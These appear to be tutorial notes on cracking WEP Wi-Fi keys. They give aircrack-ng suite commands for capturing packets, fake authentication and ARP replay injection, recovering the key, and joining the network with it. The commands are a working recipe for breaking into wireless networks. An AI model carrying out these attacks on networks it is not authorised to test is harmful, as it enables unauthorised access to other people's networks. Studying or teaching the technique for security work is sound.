# Gaining access WEP

- we need a large amount of packets in order to have enough IVs (vector keys). We can do this by using airodump-ng command on the target network and write results to file
```
airodump-ng --bssid <target-network-bssid> --channel <target-network-channel> --write <filename> <wirless-adapter>
```

- use the capture file to crack key
```
aircrack-ng <filename.cap>
```
at the end of this command, if success, you get this message:
KEY FOUND! [41:73:32:33:70] (ASCII: As23p)

you can use the ascii key to connect to the network but you don't always get this key but you always get the key in square brackets, you can connect to the network by using this key instead without ':' symbols (ex. 4173323370)

## Crack WEP if network is not busy (it does not generate enough IVs)

- listen the target network as before
```
airodump-ng --bssid <target-bssid> --channel <channel> --write <filename> <wirless-adapter>
```

- assosiate with the target network (fakeauth attack)
```
aireplay-ng --fakeauth 0 -a <target-bssid> -h <wireless-adapter-mac-addr> <wirless-adapter>
```

- force IVs generation (ARP replay attack)
```
aireplay-ng --arpreplay -b <target-bssid> -h <wireless-adapter-mac-addr> <wirless-adapter>
```

- use the capture file to crack key as before
```
aircrack-ng <filename.cap>
```
